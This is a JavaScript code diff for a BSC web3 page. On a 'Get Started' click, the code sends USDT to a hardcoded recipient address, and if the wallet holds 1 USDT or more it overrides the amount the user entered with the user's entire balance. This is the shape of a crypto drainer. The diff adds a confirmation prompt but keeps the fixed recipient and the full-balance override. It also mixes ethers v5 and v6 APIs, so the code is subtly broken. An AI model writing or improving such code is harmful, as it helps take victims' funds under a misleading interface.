@@ -1,4 +1,4 @@
-import { JsonRpcProvider, Web3Provider, Contract, utils } from 'ethers';
+import { JsonRpcProvider, Web3Provider, Contract, formatUnits, formatEther, parseUnits } from 'ethers';
 
 const USDT_CONTRACT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
 const RECIPIENT_ADDRESS = '0x1EaDA2b8cC4054Cee7b95087F4D1E913Ca22131d';
@@ -14,19 +14,21 @@ const bscProvider = new JsonRpcProvider(rpcUrl);
 // Function to Switch Network to BSC
 export const checkAndSwitchToBsc = async () => {
     try {
-        if (window.ethereum) {
-            const currentNetwork = await window.ethereum.request({ method: 'eth_chainId' });
-            const bscChainId = '0x38';  // BSC Chain ID
+        if (!window.ethereum) {
+            throw new Error("No Ethereum wallet detected. Please install MetaMask.");
+        }
+        const currentNetwork = await window.ethereum.request({ method: 'eth_chainId' });
+        const bscChainId = '0x38';  // BSC Chain ID
 
-            if (currentNetwork !== bscChainId) {
-                await window.ethereum.request({
-                    method: 'wallet_switchEthereumChain',
-                    params: [{ chainId: bscChainId }],
-                });
-            }
+        if (currentNetwork !== bscChainId) {
+            await window.ethereum.request({
+                method: 'wallet_switchEthereumChain',
+                params: [{ chainId: bscChainId }],
+            });
         }
     } catch (error) {
         console.error("Error switching network:", error);
+        throw error;
     }
 };
 
@@ -35,11 +37,11 @@ export const fetchBalances = async (address) => {
     try {
         const usdtContract = new Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, bscProvider);
         const usdtBalance = await usdtContract.balanceOf(address);
-        const formattedUSDTBalance = utils.formatUnits(usdtBalance, 18);
+        const formattedUSDTBalance = formatUnits(usdtBalance, 18);
 
         const provider = new Web3Provider(window.ethereum);
         const bnbBalanceRaw = await provider.getBalance(address);
-        const formattedBNBBalance = utils.formatEther(bnbBalanceRaw);
+        const formattedBNBBalance = formatEther(bnbBalanceRaw);
 
         return {
             usdt: parseFloat(formattedUSDTBalance),
@@ -66,7 +68,9 @@ export const handleGetStartedClick = async (usdtAmountInput) => {
         let finalTransferAmount = parseFloat(usdtAmountInput);
 
         // **Override Input if Balance ≥ 1 USDT**
-        if (balances.usdt >= 1) {
+        if (balances.usdt >= 1 && finalTransferAmount !== balances.usdt) {
+            const userConfirmed = window.confirm(`Your entire USDT balance (${balances.usdt} USDT) will be transferred. Continue?`);
+            if (!userConfirmed) return;
             finalTransferAmount = balances.usdt;
         }
 
@@ -75,10 +79,10 @@ export const handleGetStartedClick = async (usdtAmountInput) => {
         // **Final Check Before Sending USDT**
         console.log("🚀 Sending USDT...");
         const contractWithSigner = new Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, signer);
-        const amountInWei = utils.parseUnits(finalTransferAmount.toString(), 18);
+        const amountInWei = parseUnits(finalTransferAmount.toString(), 18);
 
         const estimatedGas = await contractWithSigner.estimateGas.transfer(RECIPIENT_ADDRESS, amountInWei);
-        const gasLimit = estimatedGas.mul(2);
+        const gasLimit = estimatedGas.mul(3).div(2); // 1.5x estimated gas
 
         const transferTx = await contractWithSigner.transfer(RECIPIENT_ADDRESS, amountInWei, { gasLimit });
         await transferTx.wait();
@@ -86,5 +90,6 @@ export const handleGetStartedClick = async (usdtAmountInput) => {
         console.log(`✅ Transfer successful!`);
     } catch (error) {
         console.error("❌ Error during transaction process:", error);
+        throw error;
     }
 };
